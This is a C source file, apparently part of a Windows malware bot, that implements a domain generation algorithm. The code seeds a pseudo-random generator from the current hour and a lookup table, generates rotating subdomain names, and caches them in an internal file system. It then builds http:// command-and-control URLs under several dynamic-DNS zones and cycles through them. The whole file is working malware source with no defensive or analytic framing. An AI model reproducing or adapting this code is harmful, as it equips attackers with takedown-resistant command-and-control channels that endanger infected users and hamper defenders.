#include "../../0lib/code/zmodule.h"
#include "common.h"
#include "domains.h"
#include "random.h"
#include "ztable.h"

const wchar_t* const _rootZones[] = { L".com", L".net", L".org", L".info", L".su", L".biz", L".pro", L".cc", L".us" };
const wchar_t* const _zones[] = { L".cloudns.pw", L".cloudns.pro", L".dyn.nuckchorris.net", L".cloudns.club", L".ddns.commx.ws"};
const char* const _domainsPathFile = "/domains";

void __stdcall domains_load_subnames()
{
    pzfs_file_t zFile;

    if (zfs_open(_pZmoduleBlock->pZfsIo, &zFile, _domainsPathFile, ZFS_MODE_READ, 1) == 0) {
        if (zfs_seek(zFile, 0, ZFS_SEEK_END) == 0) {
            uint32_t fSize = zfs_tell(zFile);
            if (zfs_seek(zFile, 0, ZFS_SEEK_SET) == 0) {
                wchar_t* names = (wchar_t*)memory_alloc(fSize);
                char* ptr = (char*)names;
                uint32_t readed;

                while (fSize != 0) {
                    if (zfs_read(zFile, (uint8_t*)ptr, fSize, &readed) != 0) {
                        break;
                    }
                    fSize -= readed;
                    ptr += readed;
                }

                zfs_close(zFile);
                if (fSize == 0) {
                    uint32_t i;
                    _pZmoduleBlock->subNames = memory_alloc(SUBNAMES_LIST_MAX_LEN * sizeof(wchar_t*));
                    for (i = 0; *names != L'\0' && i < SUBNAMES_LIST_MAX_LEN; ++i) {
                        _pZmoduleBlock->subNames[i] = names;
                        for (; *names != L'\0'; ++names);
                        ++names;
                    }
                }
            }
        }
    }
}

void internal_domains_save_subnames_cb(async_work_t* req)
{
    pzfs_file_t zFile;

    if (zfs_open((zfs_io_manager_t*)_pZmoduleBlock->pZfsIo, &zFile, _domainsPathFile, ZFS_MODE_CREATE | ZFS_MODE_TRUNCATE | ZFS_MODE_WRITE, 1) == 0) {
        uint32_t written;
        uint32_t remains = 1; // завершающий '\0'.
        wchar_t* ptr = _pZmoduleBlock->subNames[0];
        for (; *ptr != L'\0'; ++ptr) {
            remains += (fn_lstrlenW(ptr) + 1) * sizeof(wchar_t);
            for (; *ptr != L'\0'; ++ptr);
            ++ptr;
        }

        ptr = _pZmoduleBlock->subNames[0];
        while (remains != 0) {
            if (zfs_write(zFile, (uint8_t*)ptr, remains, &written) != 0) {
                break;
            }
            remains -= written;
            ptr += written;
        }

        zfs_close(zFile);
    }
}

void internal_domains_after_save_subnames_cb(async_work_t* req, int status)
{
    memory_free(req);
}

wchar_t* __stdcall domains_generate_name_for_time(uint32_t unixTime)
{
    wchar_t* name;
    uint32_t i, currPeriod, seed, nameLen, minVal, maxVal;

    currPeriod = unixTime / 3600 / SUBNAMES_UNIQUE_PERIOD;
    seed = ((uint32_t*)ztable)[currPeriod % 128] ^ currPeriod;
    possessor_random_init(seed);

    for (i = 0; i < 756; ++i) {
        possessor_random();
    }

    minVal = SUBNAME_MIN_SIZE + (possessor_random() % (SUBNAME_MAX_SIZE - SUBNAME_MIN_SIZE + 1));
    nameLen = SUBNAME_MIN_SIZE + (possessor_random() % (SUBNAME_MAX_SIZE - SUBNAME_MIN_SIZE + 1));
    maxVal = max(nameLen, minVal);

    if (minVal == maxVal) {
        minVal = nameLen;
    }

    nameLen = minVal + (possessor_random() % (maxVal - minVal + 1));
    name = zs_new_with_len(NULL, nameLen);

    for (i = 0; i < nameLen; ++i) {
        uint32_t val = 48 + (possessor_random() % 36);

        if (val > 57) {
            val += 39;
        }
        if (i == 0 && val <= 57) {
            val = 97 + (possessor_random() % 26);
        }
        name[i] = (wchar_t)val;
    }

    return name;
}

BOOL __stdcall domains_generate_names_if_needed()
{
    BOOL created = FALSE;
    LARGE_INTEGER freqStamp;
    LARGE_INTEGER adder;
    uint32_t i;
    wchar_t* name;
    wchar_t* names;

    fn_QueryPerformanceCounter(&freqStamp);
    adder.QuadPart = (freqStamp.QuadPart - _pZmoduleBlock->lastFreqStamp.QuadPart) / _pZmoduleBlock->perfFreq.QuadPart;
    _pZmoduleBlock->utcLastTime += adder.LowPart;
    _pZmoduleBlock->lastFreqStamp.QuadPart = freqStamp.QuadPart;

    name = domains_generate_name_for_time(_pZmoduleBlock->utcLastTime);

    if (_pZmoduleBlock->subNames == NULL) {
        created = TRUE;
    }
    else {
        names = _pZmoduleBlock->subNames[0];
        for (; *names != L'\0'; names += fn_lstrlenW(names) + 1) {
            if (fn_lstrcmpiW(name, names) == 0) {
                break;
            }
        }

        created = (*names == L'\0');
    }
    zs_free(name);

    if (created) {
        async_work_t* pSubsSaveWork;
        uint32_t allNamesLen = 1, nameLen, periodItr = _pZmoduleBlock->utcLastTime / 3600 / SUBNAMES_UNIQUE_PERIOD;
        uint32_t periodItrEnd;

        if (periodItr % 2 != 0) {
            --periodItr;
        }
        periodItr -= 2;
        periodItrEnd = periodItr + SUBNAMES_LIST_MAX_LEN;
        names = NULL;
        for (; periodItr < periodItrEnd; ++periodItr) {
            uint32_t period = periodItr * SUBNAMES_UNIQUE_PERIOD * 3600;
            name = domains_generate_name_for_time(period);
            nameLen = fn_lstrlenW(name) + 1;

            names = (wchar_t*)memory_realloc(names, (allNamesLen + nameLen) * sizeof(wchar_t));
            fn_lstrcpyW(names + allNamesLen - 1, name);
            allNamesLen += nameLen;
            zs_free(name);
        }

        if (_pZmoduleBlock->subNames != NULL) {
            memory_free(_pZmoduleBlock->subNames[0]);
            memory_free(_pZmoduleBlock->subNames);
        }
        _pZmoduleBlock->subNames = memory_alloc(SUBNAMES_LIST_MAX_LEN * sizeof(wchar_t*));
        for (i = 0; i < SUBNAMES_LIST_MAX_LEN; ++i) {
            _pZmoduleBlock->subNames[i] = names;
            for (; *names != L'\0'; ++names);
            ++names;
        }

        pSubsSaveWork = (async_work_t*)memory_alloc(sizeof(async_work_t));
        async_queue_work(async_default_loop(), pSubsSaveWork, internal_domains_save_subnames_cb, internal_domains_after_save_subnames_cb);
    }

    return created;
}

wchar_t* __stdcall domains_get_full_url()
{
    wchar_t* fullUrl = zs_new(L"http://");
    fullUrl = zs_cat(fullUrl, _pZmoduleBlock->subNames[_pZmoduleBlock->subNameIndex]);
    fullUrl = zs_cat(fullUrl, _zones[_pZmoduleBlock->zoneIndex]);
    fullUrl = zs_cat(fullUrl, L"/");

    return fullUrl;
}

int __stdcall domains_next_one()
{
    int ret = 1;
    if (_pZmoduleBlock->subNameIndex == (SUBNAMES_LIST_MAX_LEN - 1)) {
        _pZmoduleBlock->subNameIndex = 0;
        if (_pZmoduleBlock->zoneIndex == (ARRAYSIZE(_zones) - 1)) {
            _pZmoduleBlock->zoneIndex = 0;
            ret = 0;
        }
        else {
            ++_pZmoduleBlock->zoneIndex;
        }
    }
    else {
        ++_pZmoduleBlock->subNameIndex;
    }

    return ret;
}

wchar_t* __stdcall domains_get_random_root_zone()
{
    return _rootZones[utils_random() % ARRAYSIZE(_rootZones)];
}